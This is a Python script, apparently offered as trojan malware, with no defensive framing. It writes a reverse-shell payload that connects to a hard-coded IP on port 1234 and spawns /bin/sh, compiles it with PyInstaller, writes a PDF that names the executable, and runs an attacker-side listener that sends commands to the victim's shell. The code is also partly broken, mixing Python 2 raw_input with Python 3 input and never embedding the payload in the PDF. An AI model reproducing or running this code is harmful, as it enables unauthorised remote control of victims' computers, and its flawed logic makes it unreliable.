import os
import socket
from fpdf import FPDF

class Trojan:
    def __init__(self):
        self.ip = ""
        self.payload = self.create_payload()
    
    def create_payload(self):
        # Create a Python script that will create a reverse shell
        with open("payload.py", "w") as f:
            f.write("import socket,subprocess,os\n")
            f.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
            f.write(f"s.connect(('192.168.2.163', 1234))\n")
            f.write("os.dup2(s.fileno(), 0)\n")
            f.write("os.dup2(s.fileno(), 1)\n")
            f.write("os.dup2(s.fileno(), 2)\n")
            f.write("p = subprocess.call([\"/bin/sh\", \"-i\"])\n")

        # Use PyInstaller to create an executable from the script
        os.system("python -m PyInstaller payload.py")

        # Return the path to the executable file
        return "dist/payload"


    def create_trojan(self):
        # Create a new PDF
        pdf = FPDF()

        # Add a page
        pdf.add_page()

        # Set the font size
        pdf.set_font('Arial', 'B', 16)

        # Write the path to the executable file
        pdf.cell(40, 10, self.payload)

        # Save the PDF
        pdf.output('test.pdf', 'F')

    def receive_reverse_shell(self):
        # Create a listening socket on the attacker's computer
        listening_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listening_socket.bind(("0.0.0.0", 1234))
        listening_socket.listen(1)

        # Wait for a connection from the victim's computer
        victim_socket, victim_address = listening_socket.accept()

        # Accept the connection and communicate with the victim's computer
        while True:
            command = raw_input("$ ")
            victim_socket.send(command + "\n")
            result = victim_socket.recv(1024)
            print(result)

trojan = Trojan()
trojan.ip = input()
payload = trojan.create_payload()
trojan_name = trojan.create_trojan()

# Send the Trojan to the victim's computer (omitted for brevity)

trojan.receive_reverse_shell()
